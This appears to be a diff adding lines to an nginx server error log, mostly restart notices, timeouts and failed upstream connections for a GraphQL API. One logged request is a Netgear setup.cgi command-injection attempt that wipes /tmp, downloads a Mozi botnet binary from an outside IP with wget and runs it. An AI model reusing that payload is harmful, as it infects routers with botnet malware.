@@ -190,3 +190,155 @@
 2023/02/13 07:09:37 [notice] 12#12: signal 17 (SIGCHLD) received from 108
 2023/02/13 07:09:37 [notice] 12#12: unknown process 108 exited with code 0
 2023/02/13 07:09:37 [info] 12#12: epoll_wait() failed (4: Interrupted system call)
+2023/02/13 14:28:27 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:28:27 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:28:27 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:28:27 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:28:27 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:28:27 [notice] 1#1: start worker processes
+2023/02/13 14:28:27 [notice] 1#1: start worker process 11
+2023/02/13 14:29:35 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 14:29:35 [notice] 11#11: exiting
+2023/02/13 14:29:35 [notice] 11#11: exit
+2023/02/13 14:29:35 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 14:29:35 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 14:29:35 [notice] 1#1: exit
+2023/02/13 14:29:39 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:29:39 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:29:39 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:29:39 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:29:39 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:29:39 [notice] 1#1: start worker processes
+2023/02/13 14:29:39 [notice] 1#1: start worker process 11
+2023/02/13 14:31:06 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 14:31:06 [notice] 11#11: exiting
+2023/02/13 14:31:06 [notice] 11#11: exit
+2023/02/13 14:31:06 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 14:31:06 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 14:31:06 [notice] 1#1: exit
+2023/02/13 14:31:10 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:31:10 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:31:10 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:31:10 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:31:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:31:10 [notice] 1#1: start worker processes
+2023/02/13 14:31:10 [notice] 1#1: start worker process 11
+2023/02/13 14:32:37 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 14:32:37 [notice] 11#11: exiting
+2023/02/13 14:32:37 [notice] 11#11: exit
+2023/02/13 14:32:37 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 14:32:37 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 14:32:37 [notice] 1#1: exit
+2023/02/13 14:34:55 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:34:55 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:34:55 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:34:55 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:34:55 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:34:55 [notice] 1#1: start worker processes
+2023/02/13 14:34:55 [notice] 1#1: start worker process 10
+2023/02/13 14:39:58 [error] 10#10: *2 open() "/usr/local/nginx/html/setup.cgi" failed (2: No such file or directory), client: 110.153.66.185, server: , request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://172.36.117.98:38458/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2023/02/13 14:51:14 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 14:51:14 [notice] 10#10: exiting
+2023/02/13 14:51:14 [notice] 10#10: exit
+2023/02/13 14:51:14 [notice] 1#1: signal 17 (SIGCHLD) received from 10
+2023/02/13 14:51:14 [notice] 1#1: worker process 10 exited with code 0
+2023/02/13 14:51:14 [notice] 1#1: exit
+2023/02/13 14:51:31 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:51:31 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:51:31 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:51:31 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:51:31 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:51:31 [notice] 1#1: start worker processes
+2023/02/13 14:51:31 [notice] 1#1: start worker process 11
+2023/02/13 14:52:05 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 14:52:05 [notice] 11#11: exiting
+2023/02/13 14:52:05 [notice] 11#11: exit
+2023/02/13 14:52:05 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 14:52:05 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 14:52:05 [notice] 1#1: exit
+2023/02/13 14:52:19 [notice] 1#1: using the "epoll" event method
+2023/02/13 14:52:19 [notice] 1#1: nginx/1.23.1
+2023/02/13 14:52:19 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 14:52:19 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 14:52:19 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 14:52:19 [notice] 1#1: start worker processes
+2023/02/13 14:52:19 [notice] 1#1: start worker process 11
+2023/02/13 14:53:13 [info] 11#11: *1 client sent invalid method while reading client request line, client: 172.104.11.46, server: , request: " Ö  Åò≈†Ω6Vr£§)”Ñ“¬Oè~ÉˇÔ˛MkW,uäÓ¯   ¿/¿0¿+¿,Ã®Ã©¿¿	¿¿"
+2023/02/13 15:00:27 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 15:00:27 [notice] 11#11: exiting
+2023/02/13 15:00:27 [notice] 11#11: exit
+2023/02/13 15:00:27 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 15:00:27 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 15:00:27 [notice] 1#1: exit
+2023/02/13 15:00:43 [notice] 1#1: using the "epoll" event method
+2023/02/13 15:00:43 [notice] 1#1: nginx/1.23.1
+2023/02/13 15:00:43 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 15:00:43 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 15:00:43 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 15:00:43 [notice] 1#1: start worker processes
+2023/02/13 15:00:43 [notice] 1#1: start worker process 11
+2023/02/13 15:01:12 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 15:01:12 [notice] 11#11: exiting
+2023/02/13 15:01:12 [notice] 11#11: exit
+2023/02/13 15:01:13 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 15:01:13 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 15:01:13 [notice] 1#1: exit
+2023/02/13 15:01:26 [notice] 1#1: using the "epoll" event method
+2023/02/13 15:01:26 [notice] 1#1: nginx/1.23.1
+2023/02/13 15:01:26 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 15:01:26 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 15:01:26 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 15:01:26 [notice] 1#1: start worker processes
+2023/02/13 15:01:26 [notice] 1#1: start worker process 11
+2023/02/13 15:06:00 [error] 11#11: *1 open() "/usr/local/nginx/html/favicon.ico" failed (2: No such file or directory), client: 171.233.231.195, server: , request: "GET /favicon.ico HTTP/1.1", host: "34.124.229.190", referrer: "http://34.124.229.190/"
+2023/02/13 15:07:00 [info] 11#11: *2 client timed out (110: Operation timed out) while waiting for request, client: 171.233.231.195, server: 0.0.0.0:80
+2023/02/13 15:12:34 [info] 11#11: *3 client timed out (110: Operation timed out) while waiting for request, client: 171.233.231.195, server: 0.0.0.0:80
+2023/02/13 15:12:34 [info] 11#11: *4 client timed out (110: Operation timed out) while waiting for request, client: 171.233.231.195, server: 0.0.0.0:80
+2023/02/13 15:12:42 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 15:12:42 [notice] 11#11: exiting
+2023/02/13 15:12:42 [notice] 11#11: exit
+2023/02/13 15:12:42 [notice] 1#1: signal 17 (SIGCHLD) received from 11
+2023/02/13 15:12:42 [notice] 1#1: worker process 11 exited with code 0
+2023/02/13 15:12:42 [notice] 1#1: exit
+2023/02/13 15:12:57 [notice] 1#1: using the "epoll" event method
+2023/02/13 15:12:57 [notice] 1#1: nginx/1.23.1
+2023/02/13 15:12:57 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 15:12:57 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 15:12:57 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 15:12:57 [notice] 1#1: start worker processes
+2023/02/13 15:12:57 [notice] 1#1: start worker process 10
+2023/02/13 15:13:09 [notice] 1#1: signal 15 (SIGTERM) received, exiting
+2023/02/13 15:13:09 [notice] 10#10: exiting
+2023/02/13 15:13:09 [notice] 10#10: exit
+2023/02/13 15:13:09 [notice] 1#1: signal 17 (SIGCHLD) received from 10
+2023/02/13 15:13:09 [notice] 1#1: worker process 10 exited with code 0
+2023/02/13 15:13:09 [notice] 1#1: exit
+2023/02/13 15:15:42 [notice] 1#1: using the "epoll" event method
+2023/02/13 15:15:42 [notice] 1#1: nginx/1.23.1
+2023/02/13 15:15:42 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219) 
+2023/02/13 15:15:42 [notice] 1#1: OS: Linux 5.10.0-21-cloud-amd64
+2023/02/13 15:15:42 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/02/13 15:15:42 [notice] 1#1: start worker processes
+2023/02/13 15:15:42 [notice] 1#1: start worker process 11
+2023/02/13 15:15:54 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:54 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:55 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:56 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:57 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:57 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:15:57 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev"
+2023/02/13 15:15:57 [error] 11#11: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "GET /favicon.ico HTTP/1.1", upstream: "http://172.30.0.5:27361/favicon.ico", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:16:17 [warn] 11#11: *18 an upstream response is buffered to a temporary file /usr/local/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "POST /graphql HTTP/1.1", upstream: "http://172.30.0.5:27361/graphql", host: "api_eliv.chisubuga.dev", referrer: "https://api_eliv.chisubuga.dev/graphql"
+2023/02/13 15:16:18 [info] 11#11: *18 client 171.233.231.195 closed keepalive connection
+2023/02/13 15:16:54 [info] 11#11: *2 client timed out (110: Operation timed out) while waiting for request, client: 171.233.231.195, server: 0.0.0.0:443
+2023/02/13 15:17:08 [info] 11#11: *32 client 54.224.244.143 closed keepalive connection
+2023/02/13 15:17:17 [info] 11#11: *36 client 54.224.244.143 closed keepalive connection
+2023/02/13 15:17:22 [warn] 11#11: *21 a client request body is buffered to a temporary file /usr/local/nginx/client_body_temp/0000000002, client: 171.233.231.195, server: api_eliv.chisubuga.dev, request: "POST /graphql HTTP/1.1", host: "api_eliv.chisubuga.dev", referrer: "https://eliv.chisubuga.dev/"
+2023/02/13 15:17:43 [info] 11#11: *46 client 3.91.196.54 closed keepalive connection
+2023/02/13 15:18:11 [info] 11#11: *42 client timed out (110: Operation timed out) while waiting for request, client: 171.233.231.195, server: 0.0.0.0:443
